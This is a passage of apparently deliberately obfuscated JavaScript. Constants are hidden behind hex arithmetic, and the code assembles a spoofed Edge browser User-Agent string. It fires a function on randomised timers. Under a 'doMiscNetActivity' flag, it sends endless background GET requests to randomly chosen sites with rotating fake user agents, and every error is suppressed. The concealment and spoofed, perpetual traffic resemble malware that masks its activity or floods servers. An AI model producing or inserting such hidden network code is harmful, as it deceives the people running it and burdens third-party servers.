      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x78f + -0x4ae + -0x1 * 0x2e1; k < -0x2 * 0x1365 + -0x7e + -0x274c * -0x1; k++)
    setTimeout(f, (-0x97fc * -0x1 + -0xde4b * 0x2 + 0x20efa) * k * getRandomInt(-0x1e4f + -0x1 * -0x1bbd + 0x293, 0x1 * -0x154a + 0xc15 + 0x4 * 0x24e));
  setInterval(() => {
    f();
    for (let l = -0x15 * 0x1bd + -0x8 * -0x1a0 + -0x1 * -0x1781; l < -0x15d6 + 0x35d + 0x127d; l++)
      setTimeout(f, (-0x176 * 0xd6 + 0xfe72 * -0x1 + 0x32176 * 0x1) * l * getRandomInt(-0xbc8 * 0x1 + 0x47e + 0x1 * 0x74b, 0x61 * -0x60 + -0x2098 + -0x44fb * -0x1));
  }, 0x3f8922 + -0x29d089 * 0x1 + 0x6b * 0x4f75);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a7 = d,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': a7(0xe)
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x2b1f + -0x25f1 * -0x1 + 0x18 * -0x23d) * getRandomInt(-0xa97 * -0x1 + 0x1c40 + 0x3 * -0xcf2, 0xa0d + 0x1090 + 0x2 * -0xd4c));
}, 0xb * -0x1dc + -0x2523 + -0x39fb * -0x1);